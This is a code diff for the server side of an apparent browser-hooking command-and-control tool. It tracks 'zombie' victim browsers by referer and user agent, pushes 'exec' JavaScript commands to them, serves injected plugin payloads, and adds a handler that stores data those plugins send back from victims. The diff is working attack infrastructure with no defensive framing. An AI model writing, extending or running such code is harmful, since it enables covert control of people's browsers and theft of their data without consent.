@@ -3,9 +3,11 @@ var fs = require('fs');
 var path = require('path');
 var pc = require('../proxy').pc;
 var plugin = require('../proxy').plugin;
+var pc_info = require('../proxy').pc_info;
 var project = require('../proxy').project;
 var eventproxy = require('eventproxy');
 var logger = require('../common/logger');
+var moment = require('moment');
 
 exports.online = function(server, admin_io, zombie_io){
     admin_io.on('connection',function(socket){
@@ -49,17 +51,21 @@ exports.online = function(server, admin_io, zombie_io){
             });
             ep.all('project', 'socket_get',function(projectName, socket_data){
                 //建立一个room
-                var update_time = Date.now();
+                var update_time = moment(Date.now()).format("YYYY年MM月DD日  hh:mm:ss");
                 var zombie_url = socket_data['zombie_referer'];
                 var zombie_ua = socket_data['zombie_ua'];
-                pc.addPC(projectName, update_time,zombie_url,zombie_ua,true,pc_socket_id, function(err,data){
+                pc.addPC(projectName, update_time,zombie_url,zombie_ua,true,pc_socket_id, function(err,pcinfo_data){
                     if(err){
                         ep.emit('err',err);
                     }
-                    socket.join(pc_socket_id);
-                    socket['pc_id'] = data.socket_id;
+                    //触发前端上线操作
+                    admin_io.emit('updatePC');
 
-                    zombie_io.to(data.socket_id).emit('exec','document.cookie="__koalaP_='+data.socket_id+'"');
+                    //加入room
+                    socket.join(pc_socket_id);
+                    socket['pc_id'] = pcinfo_data.socket_id;
+
+                    zombie_io.to(pcinfo_data.socket_id).emit('exec','document.cookie="__koalaP_='+pcinfo_data.socket_id+'"');
                 });
             });
             //获取项目信息
@@ -89,10 +95,13 @@ exports.online = function(server, admin_io, zombie_io){
         //处理状态更新
         socket.on('updateZombieStatus',function(data){
             //update  触发前端进行更新.
+            admin_io.emit('updatePC');
             socket.join(data.pc_socket_id);
         });
         //disconet
         socket.on('disconnect',function(data){
+            //update status
+            admin_io.emit('updatePC');
             //pc.updatePC({_id:});
             try{
                 var pc_socket_id = socket.handshake.headers.cookie.match(/__koalaPC_=(.*?)(;|$)/)[1];
@@ -105,9 +114,22 @@ exports.online = function(server, admin_io, zombie_io){
                     return;
                 }
             });
+        });
+        //插件返回信息处理
+        socket.on('trans_data',function(data){
+            //信息入库.
+            cookie = socket.handshake.headers.cookie;
+            pc_id = cookie.match(/__koalaPC_=(.*?)(;|$)/);
+            if(pc_id){
+                pc_info.addPC_Info(pc_id[1], data, function(err,pc_info_data){
+                    if(err){
+                        logger.error('info error!');
+                        return;
+                    }
+                });
+            }
         })
     });
-
 
 };
 
@@ -169,10 +191,12 @@ exports.index = function(req,res,next){
             plugin.getNamesByQuery({'_id':{$in:plugins_list}},{},function(err,plugin_info){
 
                 plugin_info.forEach(function(plugin_code){
-                    data = data + plugin_code.code;
+                    //过滤下 plugin_code.code
+                    var exp = plugin_code.code.replace(/\{~plugin~\}/g,plugin_code.name);
+                    data = data + exp;
                 });
                 res.append('Set-Cookie', '__koalaPC_='+pc_socket_id+'; Path=/;');
-                res.send(data);
+                res.send(data+"});");
             });
         });
     });
